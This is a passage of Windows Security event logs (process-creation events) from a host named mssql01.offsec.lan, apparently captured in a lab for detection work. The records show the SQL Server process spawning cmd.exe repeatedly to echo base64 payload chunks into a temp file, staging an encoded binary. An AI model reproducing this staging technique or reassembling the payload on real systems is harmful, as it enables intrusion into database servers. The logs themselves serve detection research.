  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:13.560070300Z" />
      <EventRecordID>1331291</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x8c4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo AaO0AogAdQuLSxCJDbUCQQBXQotTEGKMAkG2O9B0SIsNudpBAKHAAkEAQUCJDa/jQQAVwAJBAKEwAkEAi68Q0LEAO8EPjRMBcgCLDcgLWQCLucPmBQPxiyawAkEAQPujrERBmYkN+wKPN+i0KAAAiehiCAAAi4MwCAAAiZNUCAAA3QaLizQIAACJTgSjizgIAACbgzAIAABvZDQIAAAryIuDPAgAMxvCO8d/CnwEV89z0TPJM8CJDxDlRhSLi1AIAGNogzAIhACLkzRecQDq+otRKw/JRxvCO8eiCnwEO89Q+zPJ2cBfThiJqhyLtUgIAABug28IAACLk38NQQAryIuDTAg2ALfC5McYCnxBO89zBAbJM8+JTgiJRgyLDRTjQAA7z3Q3iw6sAkEFHEmZ9/nK0rYoixXIwEAAVoPC0wlA6EAAUv+fgMFAAEHIwEAAg8BAUP8VVOBRmYMvT4m7JAgAAIlhHIm7KG8AZom7IAgAAImMEGBXA+i/JwAAo6ALQQCJFaQL0bSJg2UIAACLDaQLQQCsYzwIAAB2FaALQZmJkzAIUQChpAtB1VOJgzTAAADoDG3//8/EBF9xW4vlXcOQkOiIArUAVto3ZMFAAIXAdSZo2OpAAKa06rMAgNZoaOpAAD3WaCC1wgD/1miAB0AA/9aDxBRew2gU6n0A/85oAOpAAM9E1EDsaMjpQADH1mh46UB+x9ZoyOlAALXW+BzpQAv/+4OGHF7ukLmQkJCQkJBVi++LRRyLDcgDQABWizWAQ0AAUOzBCGhk8g4AUZHWi4ySwC0AFz3y3IeDwkBS/5yhyMCJANYg8mwzg8BAUP/Wiw3IwEAAaOTxQCKDwUBR/9aLFciWQgBorPFAAIPC6VL/1qHIwEAAaLLxQACDwEBQ/zSLDQLAzABoIPFAAIPBQFH/1osKyJ5AiWi3mUCag8JAUv/WocLAQACDxESDwED9lAZAAFD/1osNyNZAtWjy8ECxg8FAUSjWixXIwEAA8yjwQACDwkBS/9ahyCpAu5js70AAg8BAUP/Wiw3IwEAAaLTvPwCDwUBR/9aLt8jAQABohO8DboPCgFL/1vnIwEB1aEhoQACDqUBQ/9ZoEIkAAIsN68BAq5TBQFHF1osVvbVJc4PEQIPCSWjQ7kAAUv/JocjAHwBoiO5AAIPAQFD/WYsNyMBAAF9A0UAAg8FAUf/Wi6vIwEAAaPA5QACDwv/x/9ahyO3xAMeo50AAosBAuP93iw1dwFoAaGDtQACfwUBRPtaLKsPAQAB+GO3FAIPCP1L/1gnIwBAAaGDtQACDwEBQ2dYfDcjhjACDxOCDwUBo4OxAAFGC1ov0yMBAwmjm6kAAg8JAZ//WocgmQK5ofMOiwoPAQFD/1osXyMBAAGhA7ECBZsFAUf/WixXIwEDgaPjr/gCDwhxS/9ahyMBA92iwUkAAg8BAUP/W2w2kwEAAp3DrQHODwVJR/9WLFcjA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:13.562302400Z" />
      <EventRecordID>1331292</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x850</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x8c4</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:13.833545600Z" />
      <EventRecordID>1331293</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x115c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo QABo4OtAAO7CQFL/u6HIzkAAg8RAg8BAaPTqQGlQs9aDxAj0Fv8VcLTqAP6QkDSQ/otlUaFMQEEAU4tdCNRXU1DodBIACaNAQEHSi/uDyf8zwB2u2Xo0wRAA99FJg/kHD3DXAAAAagdo2PJAAO3/1oPEDIXAY4XCfwAAx8NEai+/YxV8wUAAg8QIiUUIhcCmhFIBAACL8KxpQEEAKPONVgFSUOiIBKwArc6L86DRi/jBnAKLpYvKg/kD86SLZQiLyCsMxgQx24sVTEBBAFIpjd38aPQXQbFQaAAYQQC/DiieVu/AD4X9AO0Aoc0YPniFwA+E8AAAl4tF/IXAD4UDAAAAZQ20QFcAYFHwERIAAKPkF0EAxgYAEjtbdWuLFQAYQZ0tamC/AFJo0PJAAFD/iw8AOYPEDKOcC0EA61aLDYPJ/zPA8q73kUmD+QgPhqv///9qCFTE8lQAU//Wg+8MhcAPFxd2/2r1DcjAQACYnPKFAIPBxVn/FYDBQACDxAhqAa/ccMFAAIsNvBgYAIkNnAtB6mah9BdBAGaFwHUcZscm9ElBAIoAX17HBYMLigC/AkEAM/2CLuVdw2Y9UAB05zM8ZovQoUxAQQBSaFvyHO5Q6MoNACqDxAyjrAtBADPUX3Eozu1dw+deuJkAZwBbJOUs3JCQkJCQkJAoB5CQ2ZB7MOyl7NhN9AChTEBBo1ZXi7gIUGj/DwAyagGTTQhXUeirTAAAi/Ag9nQtjTSIalNSVs55PwBBUKHIwDcAV4NPWmhg860AUP8VYcFAAIPEEIvGkl6LflbDi5sI8pUo////UWhwsXMAGuhDB50Ai/CF9tgujUWIamx8Vuj4PwAAiw3IwEAAN1eDwUBoNFJAZVH/K4DBQACDxBCLEF9ei+XYpYuFOf///1CjcPhaABoQXMHpAIMoBKMgOEEAtcBfI4sVyMBAgmgI80AAg8RAUv8VtcFAAHGy87gMACZBc16L5V3Diw1wAkEli1UIajeYYFJFO1AAAIvwhfbgLY1FiGp4UI3oqZoAAIsNyMBAAEeDbUDZ4PJAAFFvFa0iQACDxAyLxl9eauVdw4tVCGnov08AAF8zwF6LfV3ykJCQkJCQ8VWL7FaLdUVqaMcGACQAABP3XMFAAIvQg8QE/9J1CrhgAAAAkl3C0gANLxoAAAAzNov6sas9Qm2JAV9eXcIEAPxVSuyLADVTVleLPTDBQACNcMs5FAAAAIsGGvd0EIsIUIkO/9eLuoPEZ4XA7/CDxgRLdeSLVQjO/9eDxK0LXltdwgQAkJCkWJCQgpCQkJCQ9FWL7ItNCItFDIlBK13CCN66beyLRQiLQAz2wgQAkJA6VYvsi00Ii0UMiUFUXcIIAFWL7ItFCItAEDzCBACrkJBli+xRoNgCQQBWisj+wITJ8tgC6QAPhbAAAABo4AJBAOgL////hcB0DMYF2AKlNwBei+Vdw/EV4AJBAFJqcWoAaNwt&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:13.835825200Z" />
      <EventRecordID>1331294</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x49c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x115c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:14.106961300Z" />
      <EventRecordID>1331295</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x46c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo QQDWYwVVAHXwhcotI6HgAkEAUOgVnP//i8bHBeACQQAAAEOyxgXYApgAAHCL5V3Diw3cAkEABYzzQABRJiwMAACCFdwCcQBS6I9ZLACFwHU5odwCQQCNTfxXaotR6NxXYACFWXW2iyH8oeCLQQD3UI8Ifv//iw3cAtMA2RU1AkELUVLoFf//hTPAXr7lXaWQkNaQMvhnzJC6kIpkkKDYAooAhIl0KP7IotgCQQB1H6HcAkEAUOjDAwAAxwWvAkEAAAAAAMcF4AKlAAAAAADDkGyQkJCQzJANUvuQkPFVi7OD7AyLRQxTjVeNUKeD4i470ItFCIlV+HMdnEAghcCRhEYCIQBqDP/qg8QEM8BfvFuL5V3eCACLuiyLThCL0RQr5b9PAhAD0V+JVhBei5Fbi3NdeQgAiwCLERSLWRAr+zvXdxmLQT6LOYk4iwH3eQSJeJXpcAbyAIt4GI2aFxAAAIHjAPD/EzvaiV0MD4LLAQAAovsAYQAAc87HkAwAIAAAIF0Mi9PB6gxNg/r/iVX8D4cdAQAAOzp7h4VJyACLRwyFwCnJs+hyVwAAi+X8i1yXFIsPjUQlFIWZ+A870bYLi1gEg8AEQoXbdDmLp4XbiV30dH9PG4Xb7AF1FTvRchGL0/yDeQRJzNJ1BNDJ2vGJD4td9ItHCFVLaQMViUcIi8iLR9I7yHYDiUf8i+wMd/90BlfopqH1rI1TGIlTEOmaogA6i0cUhUN0OYtHDBDAdAZQOhdXAACLXxQ6RxSF2zoSi038i1MIO0d2SIvDixuF23Xui38MutJ0BlfodFcYtYtzDFP/eFzBQCmDxASFNg+ExQAAPItV/I09GIlQCI0UGInhEFMAANIAAIlQFIvI6zSLE4kQi0Mri38IA8jtRwQ7yIlPinZciUcIi38Mhf90BlejB1cAII1LGIlLEMcDAEAAAIvLi1X4/0Ezx0EMub8AADHQifBPaFYEiVFYiQo9VQiJOolOBIlKLItOFIt+ayvPiz6BwQAQAACL14HhR/D//0nB+QyJTgyLWgw7y3P/ixI7Sihy+YvABIk5iw6LfgSJeQRySgSJTgRrMYmg+XJ7ll6W/OU6wj6ji+MI62oghQ7gB2oM/+6DxARfXjPAW4vlFsIIAHiQipCQkKyQVWzsuWoMU1ZXi30IeXc4M+j7XwAAi0cEM4GDxAQ7w4mJiQI8dA1Q6PQAAACkRwQ7w3XzjXdvVujUCQAAkt8cKh5QmF8U6Aa0AADvRzCLWjSJXxyJySSJRyyJSBCLeFzECDvIiUX084SpAACei1AE/BqLf5iL5otHDIXAdAZQhW10AACLB4tPBItXCInDCFDG/LITi038iUX4i0YIhcl0msvsdgaJHove6y+D+BRUGItMwxuF8okOdQg7RQh2A7ZFCIl06xTr/Is4J4kOiXcUO9ByBCt26wIz0ot1+IX2dbGLnwh0IAiJB1p/6oX/UwZX6GtVAACF&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:14.109252600Z" />
      <EventRecordID>1331296</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x11e8</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x46c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:14.380464700Z" />
      <EventRecordID>1331297</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x7e8</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo 23QUizUwwUAAi8OLG1B8SYPERIXbdYqLRfSJABmTBF9eW4vlXSgEAJCQVYvsgxYMU4vkA1ZXVHM4q+jbCPtdEUMEg8QEhdPHBgAAAPbHqecArwAAdA1Q6M7///9xQw2qwHXzjUNZUOgZFIUAi1bjUehRCAAAi1SDNQiFwHSXi1AYpuh8+v8ni/CF9nQGVupnVAAAi0MMi0sIiQiLQww8TQB0gotTCIlCDIWudAZWsIdUAACLczCLezlXi0YQxxYAAAAA6JL6//87x+0IagBx6Of6Yf+LRwwz24XAdH4l6BdUSwAOVwSLbIlV+ItXCA07/IkGi+H4iUWti0YIhcl0CjvC3w2JHove6wWD+BRzGItMFxSFyYlSdQg7RRd2A4lF/Il0hxTrCItPFIm4iTgUO9ByBA7QcAIz0ot19Jn2HzCLU/yJpkSJB4tHDIXAdDJQ6BVU9wCF23QUizXMVEAA8cOLG1D/1oPEBIXbdfJX6Of5//87RYt1Fq3ou/lbbV9e+w7lXcIEhJCQbPSLEItFCMf7AAAAgYsHDIXAdQuLDaECQQCJTdSLwYtNEIXJdQqFwEsGi1AgiVUQU/9dFDxXhdt1A4tYGIsDvwEAxgA7x3JXi0MMhcB0BlDoHFMAALDFGIsLjUMYi9eF9nXmO9FzCxtwBINVBEKF9lDxizBtMXRTiz6F/4k4D4WKAAAxO9EPpoIAAAAMUPwa+QRJhYl1BIXVd/GJC+sTi0MUgnMUhcB0L4pDDIXegAZQFrtSAGGLxosRhfZ0DTl+CHMDNMaLNoX2dfOLOeiUwHQGUAgJUwAAaAAgmQD/FcvBQAC38IPEBIX2D4TZAAAAjUYYZoYAIAA+yAZeAFAAMn4IiVYQ70YU6zSLFokQizLki5zGA/iLQxyLz4kpt8LI/AOJQ1REQwyFwHQGUOivQAAAjU4YxwYAAABHiU4Qi34QixEAiTaJzgSNR0CJRzSJRgqJXxiLXQy6d7fdOywz9rVPIDveiQQEiXcQ7HcUifmZiXc8iXcciXckiXcoiR90YotTGFJOJ/jujjvGiUUQdAmxztotAACLdRBJSwSDwwRYVwg7zokKEAOJUQw1O47Gia4wdDRQ6CZSAOhNRQiJVV9eMwb5XcIQAItFEIXAdAdqDP/Qg8QEX164DJ4AAFtdwhAAf3cIiXe9+h8IJjhfXjPAW3LCEACQkJCQkJCQkJBoVYvsRuwgX1ZXi2QIjn3sM9uLRyxYRSKLIxCJTeCLUItKxkXwAJlVsIld9ItGEPdQGTvKdSqNVeCR6G4BAACDQQR1+P91GYtHIDvD6ztqhP/Qg8TJM8BfXluL5V3CDACLRRCLTQxQjTBNUVJoQFNAAOj7HgAAyvj/dRltRyA7w3SClzX/0FTEBF9eM8Bbi+VdwgwtAEUE2QAAi01Di1EQK8KJVdGDwAgk8QM8iUFDi0v0O2Ry0aAA8vFJfxiLRwyFcXQGUOinUAAA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:14.382691600Z" />
      <EventRecordID>1331298</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xf4c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x7e8</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:14.653807700Z" />
      <EventRecordID>1331299</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xd50</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo 0FcEEg+JVWOLVwiJTQyLBotN/IniYotGCIXJdAo7wlQGiR6L3usvg/gUcwWL5JgUn8mJQYkIO0UMdkyJRaGJdIcU6wiLTxTIDol3FDvQcgQr0DZ3UNKL1viFBXWxi0UMnVcIiQeLfwyF/3QGV+iJUAAAhb50FIs1MNbYh90+ixt2/9b7xASF9jjyizQQi30IikXwhMB1C19ei8KOi+VdwgwAoU3oi0csxzUMAFoAFYtQXYlRBIkKiQGJSATvTyyLSBTwihCLMNoZ+sEAgQEAi9aB4fPw//9JwcYMiUgMi8kwO89zsYsdOxUMcl6LSASJMYsI4XAEiXEEi0oEifYEiQGJENRCBItFEI5eWz9VXcLuAJCQkJCQVULsg+yri1UTU1ZXi1oIoAL3egwrQzaJRfSNDFCD6yBzBbkgAAAAgHoQAIvBdfWLiRQrcBA7SXdxi0IEUDCJMXsIi3CoiXEEi0tYiUgEiQGJGIlDBMe4DE4AAMyJjCyLmOKLS5SLMyvBM84FAB0A4CUA8P//SMH4DDZDDF/VUXMhiwk7QQzk+YtDBIkwiwOLc1CJcASLQQSJQwSJ7IkTiVlti0cs6VoAAACLdxgrgRcQAAAlAPD//zvBiUX8D4K1AWAAPRcgAABzCoxF/AAgIgA3Rfzy+MHvDE+D//+JffgPh5oBFQA7OxuHK/oAAItGDIXAdAZQ6JVOAACDfBoUAIsajURgFIubTFX1OBA70XMJWsAEvoM4ZHTziVX4ixDf0olV8I6+nAAA8os6hRw5OHUWOU34chGLePyD6BtJhf91BIXJd7iJDotKCItGCAPBiUahixOLMMmnyJsDiUabi3YMhfZ0CRQulIQAwovs8I1CGMcCAAAAAIlCEIvJix4IikoQocl0CIsRFD/OFFoUxkIQAYtNgYtzENx4EIvZwekC8xexy4PhA/OkiUIIi0gwi/NfA87qiQqLQBRIW4lCBDPAi+W1w4uWDIXtdElW6FQaAAD3QYtOFIXJdD2LRvOFcHQJUOinTQAAi1UIV34UjUYUhf90EIsQ+DtPCHboi8eLP4X/dfCLdgyF9nQGVujtTUu0i31Ki0UqUDImXFtAAMPE6OHAdFmLt/y3UBiJUBDHPwAPAACNFAiJeAiJUBTpOSr//4uqKAiLRwiLTggDyEtGBDvIiU4IdgNtRgiLdgyF43QJVtP6TRkAi1UIjk8YxyB1JQAAiU8Qi8fGAP///+Beg8j/W4vlXcPBkN7lPUZV+3KLTd+LVQiNRRBQUVLofHHt/13DkJCQd5AokJCQkFWL7ItNCItFDIlBKF3CCACwi+wii3UIhSR0MH1GFIW9dAeLCIkgbusIaulW6D/0/wzsVQyLTZeJggSLVRSJSMvHUAyLThB3D8pGfWRdLhAAVYvsi1UIU1ZXhdJ0X4tCEIt1EIt9oo25EIXAdCA5eAR1BXxwCHSai8iLzYXAde7rDIsYiaOLShSJCIlR&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:14.656226600Z" />
      <EventRecordID>1331300</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xd54</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xd50</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
